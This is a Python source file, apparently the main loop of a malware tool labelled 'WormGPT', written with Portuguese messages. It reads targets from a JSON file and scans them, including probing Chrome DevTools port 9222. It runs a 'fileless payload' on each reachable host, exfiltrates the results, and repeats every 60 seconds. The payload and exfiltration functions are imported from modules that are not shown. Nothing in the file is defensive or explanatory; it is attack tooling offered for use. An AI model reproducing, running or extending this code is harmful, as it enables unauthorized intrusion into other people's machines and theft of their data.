import os
import json
import time
from scan import scan_network_from_objectives
from payloads.fileless import execute_payload
from exfil import send_exfiltration
from colorama import Fore, Style
from pythonping import ping
import socket


def passive_ping(ip):
    """Verifica se o IP responde a ping ICMP."""
    try:
        resp = ping(ip, count=1, timeout=1)
        return resp.success()
    except:
        return False


def has_browser_service(ip):
    """Tenta detectar serviços associados a navegadores (Chrome, Edge DevTools etc)."""
    ports = [9222, 5357]
    for port in ports:
        try:
            with socket.create_connection((ip, port), timeout=1):
                print(Fore.YELLOW + f"[🧠] Porta {port} aberta — possível navegador ativo." + Style.RESET_ALL)
                return True
        except:
            continue
    return False


def run_agent():
    print(Fore.CYAN + "\n[🎯] Iniciando missão WormGPT (agente autônomo)\n" + Style.RESET_ALL)

    dir_path = os.path.dirname(__file__)
    obj_path = os.path.join(dir_path, "objectives.json")

    with open(obj_path) as f:
        objectives = json.load(f)

    if "targets" not in objectives or not objectives["targets"]:
        print(Fore.RED + "[❌] Nenhum alvo definido no JSON. Abortando missão." + Style.RESET_ALL)
        return

    while True:
        print(Fore.BLUE + "[🔁] Ciclo de varredura em execução..." + Style.RESET_ALL)
        targets = scan_network_from_objectives()

        for host in targets:
            ip = host["ip"]
            should_try = False

            if host["reachable"]:
                should_try = True
            else:
                print(Fore.YELLOW + f"[⚠️] Alvo {ip} offline ou protegido. Avaliando fallback heurístico..." + Style.RESET_ALL)

                # 🧠 Tenta ping passivo ou detectar porta de navegador
                if passive_ping(ip):
                    print(Fore.YELLOW + f"  ↳ [📶] Ping ICMP respondeu, host pode estar ativo." + Style.RESET_ALL)
                    should_try = True
                elif has_browser_service(ip):
                    print(Fore.YELLOW + f"  ↳ [🌐] Porta de navegador detectada, tentativa forçada." + Style.RESET_ALL)
                    should_try = True

            if should_try:
                print(Fore.GREEN + f"\n[💥] Executando payload fileless em {ip}" + Style.RESET_ALL)
                result = execute_payload(ip, goals=objectives["goals"])

                if result:
                    try:
                        data = json.dumps(result)
                        send_exfiltration(data)
                    except Exception as ex:
                        print(Fore.RED + f"[‼️] Falha na exfiltração: {ex}" + Style.RESET_ALL)
            else:
                print(Fore.MAGENTA + f"[🛑] Host {ip} não respondeu a heurísticas. Pulando." + Style.RESET_ALL)

        print(Fore.MAGENTA + "\n[⏳] Dormindo por 60 segundos antes de novo ciclo...\n" + Style.RESET_ALL)
        time.sleep(60)


if __name__ == "__main__":
    run_agent()
